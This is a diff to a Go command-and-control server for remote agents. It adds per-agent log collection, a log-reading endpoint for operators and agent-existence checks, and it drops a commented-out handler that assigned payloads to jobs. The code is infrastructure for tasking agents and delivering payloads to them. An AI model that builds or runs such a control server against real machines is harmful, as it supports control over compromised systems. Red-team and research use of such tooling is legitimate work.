@@ -25,6 +25,7 @@ type C2Server struct {
 	jobsResults          map[string]string
 	payloads             map[string]string
 	completedJobs        map[string][]string
+	logs                 map[string][][]string
 }
 
 type connectAgent struct {
@@ -82,6 +83,7 @@ func NewC2Server(hostOpt, portOpt, password string) (*C2Server, error) {
 	c2s.jobsStatuses = make(map[string]bool)
 	c2s.jobsResults = make(map[string]string)
 	c2s.completedJobs = make(map[string][]string)
+	c2s.logs = make(map[string][][]string)
 	return &c2s, nil
 }
 
@@ -103,8 +105,9 @@ func (c2s *C2Server) setupRouter() (*gin.Engine, error) {
 	agent.Use(authAgentMiddleware.MiddlewareFunc())
 	{
 		agent.GET("/jobs", c2s.jobsHandler)
-		agent.GET("/jobs/payload/:job-uuid", c2s.payloadHandler)
+		agent.GET("/jobs/:job-uuid/payload/", c2s.payloadHandler)
 		agent.POST("/jobs/update", c2s.updateJobStatusHandler)
+		agent.POST("/logs/add", c2s.addLogsHandler)
 	}
 
 	authOperatorMiddleware, err := c2s.initOperatorJWTMiddleware()
@@ -122,7 +125,7 @@ func (c2s *C2Server) setupRouter() (*gin.Engine, error) {
 		operator.POST("/agents/job/add", c2s.addJobHandler)
 		operator.GET("/agents/:agent-uuid/jobs", c2s.getAllAgentJobsHandler)
 		operator.GET("/agents/:agent-uuid/jobs/:job-uuid/status", c2s.getJobStatusHandler)
-		// operator.POST("/agents/payloads/add", c2s.addPayloadHandler)
+		operator.GET("/agents/:agent-uuid/logs", c2s.getAllAgentLogsHandler)
 	}
 	return r, nil
 }
@@ -210,7 +213,12 @@ func (c2s *C2Server) initAgentJWTMiddleware() (*jwt.GinJWTMiddleware, error) {
 
 func (c2s *C2Server) jobsHandler(c *gin.Context) {
 	agent, _ := c.Get(c2s.agentIdentityKey)
-	c.JSON(200, c2s.activeJobs[agent.(*Agent).Uuid])
+	if c2s.findAgent(agent.(*Agent).Uuid) {
+		c.JSON(200, c2s.activeJobs[agent.(*Agent).Uuid])
+	} else {
+		c.JSON(404, gin.H{"status": "agent not found"})
+	}
+
 }
 
 func (c2s *C2Server) payloadHandler(c *gin.Context) {
@@ -252,6 +260,31 @@ func (c2s *C2Server) updateJobStatusHandler(c *gin.Context) {
 					c2s.completedJobs[receivedAgent.(*Agent).Uuid] = append(c2s.completedJobs[receivedAgent.(*Agent).Uuid], updateJobStatusRequest.JobUuid)
 				}
 			}
+		}
+	} else {
+		c.JSON(404, gin.H{"status": "agent not found"})
+	}
+}
+
+func (c2s *C2Server) addLogsHandler(c *gin.Context) {
+	receivedAgent, _ := c.Get(c2s.agentIdentityKey)
+	if c2s.findAgent(receivedAgent.(*Agent).Uuid) {
+		var logJsonRequest []struct {
+			Level   string `json:"level"`
+			Status  string `json:"status"`
+			Stage   string `json:"stage"`
+			Time    string `json:"time"`
+			Message string `json:"message"`
+		}
+		if c.Bind(&logJsonRequest) == nil {
+			for _, log := range logJsonRequest {
+				if len(c2s.logs[receivedAgent.(*Agent).Uuid]) == 0 {
+					c2s.logs[receivedAgent.(*Agent).Uuid] = [][]string{{log.Level, log.Status, log.Stage, log.Time, log.Message}}
+				} else {
+					c2s.logs[receivedAgent.(*Agent).Uuid] = append(c2s.logs[receivedAgent.(*Agent).Uuid], []string{log.Level, log.Status, log.Stage, log.Time, log.Message})
+				}
+			}
+			c.JSON(200, gin.H{"status": "ok"})
 		}
 	} else {
 		c.JSON(404, gin.H{"status": "agent not found"})
@@ -406,31 +439,14 @@ func (c2s *C2Server) getJobStatusHandler(c *gin.Context) {
 	}
 }
 
-// func (c2s *C2Server) addPayloadHandler(c *gin.Context) {
-// 	var addPayloadHandler struct {
-// 		AgentUuid       string `json:"agent-uuid" binding:"required"`
-// 		JobUuid         string `json:"job-uuid" binding:"required"`
-// 		PayloadFilename string `json:"payload-filename" binding:"required"`
-// 	}
-// 	if c.Bind(&addPayloadHandler) == nil {
-// 		if c2s.findAgent(addPayloadHandler.AgentUuid) {
-// 			jobFound := false
-// 			for _, job := range c2s.activeJobs[addPayloadHandler.AgentUuid] {
-// 				if addPayloadHandler.JobUuid == job {
-// 					jobFound = true
-// 				}
-// 			}
-// 			if jobFound {
-// 				c2s.payloads[addPayloadHandler.JobUuid] = addPayloadHandler.PayloadFilename
-// 				c.JSON(200, gin.H{"status": "ok"})
-// 			} else {
-// 				c.JSON(404, gin.H{"status": "job not found"})
-// 			}
-// 		} else {
-// 			c.JSON(404, gin.H{"status": "agent not found"})
-// 		}
-// 	}
-// }
+func (c2s *C2Server) getAllAgentLogsHandler(c *gin.Context) {
+	agentUuid := c.Param("agent-uuid")
+	if c2s.findAgent(agentUuid) {
+		c.JSON(200, c2s.logs[agentUuid])
+	} else {
+		c.JSON(404, gin.H{"status": "agent not found"})
+	}
+}
 
 func (c2s *C2Server) Run() error {
 	err := c2s.r.RunTLS(c2s.host+":"+c2s.port, "data/c2/"+c2s.host+".crt", "data/c2/"+c2s.host+".key")
